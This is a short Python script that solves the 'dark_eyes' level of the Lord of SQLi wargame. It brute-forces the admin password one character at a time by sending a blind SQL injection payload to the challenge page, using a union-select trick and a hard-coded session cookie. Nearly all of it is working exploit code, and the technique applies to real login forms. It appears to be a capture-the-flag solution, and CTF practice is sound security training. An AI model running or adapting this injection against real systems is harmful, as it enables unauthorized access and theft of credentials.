# LordofSQLi: dark_eyes
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php'
cookies = {'PHPSESSID': 'm1jnd06uu6k8cs39v8ucvr4ads'}
passwd = ''

while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"' || id='admin' && (select 1 union select (pw like '{passwd + c}%'))#"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(c, end='', flush=True)
        if 'admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break

print('\n->' + passwd)
